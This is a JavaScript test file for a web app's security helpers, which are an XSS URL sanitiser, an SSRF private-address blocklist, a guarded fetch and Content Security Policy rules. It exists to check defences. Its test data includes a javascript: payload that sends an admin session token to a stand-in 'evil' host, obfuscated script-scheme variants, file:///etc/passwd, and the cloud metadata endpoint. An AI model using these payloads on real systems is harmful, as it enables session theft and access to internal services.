import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';

import { safeHttpUrl, isPrivateIp, fetchGuarded, buildCspDirectives } from '../src/security.js';

/* ---------------- safeHttpUrl: the stored-XSS gate ---------------- */

test('safeHttpUrl accepts ordinary http(s) links', () => {
  assert.equal(safeHttpUrl('https://tiktok.com/@user/video/123'), 'https://tiktok.com/@user/video/123');
  assert.equal(safeHttpUrl('http://example.com/a?b=c'), 'http://example.com/a?b=c');
  assert.equal(safeHttpUrl('  https://example.com/  '), 'https://example.com/');
});

test('safeHttpUrl rejects script-bearing schemes', () => {
  // The exact payload a creator would submit to steal an operator's session.
  assert.equal(safeHttpUrl("javascript:fetch('//evil/?t='+sessionStorage.clicki_admin_token)"), null);
  assert.equal(safeHttpUrl('JavaScript:alert(1)'), null, 'scheme match must be case-insensitive');
  assert.equal(safeHttpUrl('java\nscript:alert(1)'), null, 'newline-obfuscated scheme');
  assert.equal(safeHttpUrl('data:text/html,<script>alert(1)</script>'), null);
  assert.equal(safeHttpUrl('vbscript:msgbox(1)'), null);
  assert.equal(safeHttpUrl('file:///etc/passwd'), null);
});

test('safeHttpUrl rejects empty, non-string and oversized input', () => {
  assert.equal(safeHttpUrl(''), null);
  assert.equal(safeHttpUrl(null), null);
  assert.equal(safeHttpUrl(undefined), null);
  assert.equal(safeHttpUrl('not a url'), null);
  assert.equal(safeHttpUrl(`https://example.com/${'a'.repeat(2100)}`), null);
});

/* ---------------- isPrivateIp: the SSRF blocklist ---------------- */

test('isPrivateIp blocks loopback, private, link-local and CGNAT ranges', () => {
  for (const ip of [
    '127.0.0.1', '10.0.0.5', '172.16.0.1', '172.31.255.255', '192.168.1.1',
    '169.254.169.254', // cloud metadata — the prize
    '100.64.0.1', '0.0.0.0', '198.18.0.1', '224.0.0.1', '255.255.255.255',
    '::1', '::', 'fc00::1', 'fd12::1', 'fe80::1',
    '::ffff:127.0.0.1', // IPv4-mapped loopback
  ]) {
    assert.equal(isPrivateIp(ip), true, `${ip} must be treated as private`);
  }
});

test('isPrivateIp allows ordinary public addresses', () => {
  for (const ip of ['8.8.8.8', '1.1.1.1', '93.184.216.34', '172.32.0.1', '192.169.0.1', '2606:4700::1111']) {
    assert.equal(isPrivateIp(ip), false, `${ip} must be treated as public`);
  }
});

test('isPrivateIp treats anything that is not an IP as unsafe', () => {
  assert.equal(isPrivateIp('example.com'), true);
  assert.equal(isPrivateIp(''), true);
});

/* ---------------- fetchGuarded: SSRF end-to-end ---------------- */

test('fetchGuarded refuses a literal private address', async () => {
  // net.connect short-circuits DNS for literal IPs, so the `lookup` hook never
  // runs — this asserts the eager check that covers that gap.
  await assert.rejects(fetchGuarded('http://169.254.169.254/latest/meta-data/'), /private address/i);
  await assert.rejects(fetchGuarded('http://127.0.0.1/'), /private address/i);
});

test('fetchGuarded refuses non-http schemes and odd ports', async () => {
  await assert.rejects(fetchGuarded('file:///etc/passwd'), /http\(s\)/i);
  await assert.rejects(fetchGuarded('http://example.com:22/'), /ports 80\/443/i);
  await assert.rejects(fetchGuarded('http://example.com:5432/'), /ports 80\/443/i);
});

test('fetchGuarded refuses a hostname that resolves to a private address', async () => {
  // localtest.me and friends resolve to 127.0.0.1 in public DNS. If the DNS
  // lookup fails in this environment, the guard still has to reject (never allow).
  await assert.rejects(fetchGuarded('http://localhost/'), (err) => err instanceof Error);
});

test('fetchGuarded never opens a socket to a real internal service', async (t) => {
  // The strongest end-to-end statement of the SSRF guard: stand up an actual
  // listening HTTP server on loopback (standing in for a metadata endpoint or an
  // internal admin panel) and assert not only that the call rejects, but that the
  // server never saw a single request.
  let hits = 0;
  const server = http.createServer((_req, res) => {
    hits += 1;
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<html>internal secret</html>');
  });
  await new Promise((r) => server.listen(80, '127.0.0.1', r).on('error', r));
  t.after(() => server.close());

  await assert.rejects(fetchGuarded('http://127.0.0.1/'), /private address/i);
  await assert.rejects(fetchGuarded('http://localhost/'), (err) => err instanceof Error);
  assert.equal(hits, 0, 'the guard must reject before any connection is made');
});

/* ---------------- CSP ---------------- */

test('CSP forbids inline script — this is what disarms a stored javascript: URL', () => {
  const d = buildCspDirectives({ isProd: true });
  assert.ok(!d.scriptSrc.includes("'unsafe-inline'"));
  assert.ok(!d.scriptSrc.includes("'unsafe-eval'"));
  assert.deepEqual(d.objectSrc, ["'none'"]);
  assert.deepEqual(d.baseUri, ["'self'"]);
  assert.deepEqual(d.frameAncestors, ["'self'"]);
  assert.deepEqual(d.formAction, ["'self'"]);
});

test('CSP allows exactly the third parties the client loads', () => {
  const d = buildCspDirectives({});
  assert.ok(d.scriptSrc.includes('https://www.googletagmanager.com'));
  assert.ok(d.scriptSrc.includes('https://mc.yandex.ru'));
  assert.ok(d.styleSrc.includes('https://fonts.googleapis.com'));
  assert.ok(d.fontSrc.includes('https://fonts.gstatic.com'));
  assert.ok(d.frameSrc.includes('https://www.google.com')); // reCAPTCHA
  // This test claimed "exactly" while never looking at img-src, and the omission
  // it missed was not cosmetic: lib/appleEmoji.js swaps every emoji on the public
  // pages for a jsdelivr sprite, and a blocked one rebuilt itself ~60×/second
  // forever. Anything the client fetches belongs in here.
  assert.ok(d.imgSrc.includes('https://cdn.jsdelivr.net'), 'emoji sprites (lib/appleEmoji.js)');
  assert.ok(d.imgSrc.includes('https://images.unsplash.com'));
});

test('CSP folds the configured object-storage host into img/media', () => {
  const d = buildCspDirectives({ mediaHosts: ['https://cdn.example.com', undefined] });
  assert.ok(d.imgSrc.includes('https://cdn.example.com'));
  assert.ok(d.mediaSrc.includes('https://cdn.example.com'));
  assert.ok(!d.imgSrc.includes(undefined), 'unset SPACES_* must not leak an undefined entry');
});

test('upgrade-insecure-requests only in production', () => {
  assert.ok('upgradeInsecureRequests' in buildCspDirectives({ isProd: true }));
  assert.ok(!('upgradeInsecureRequests' in buildCspDirectives({ isProd: false })));
});
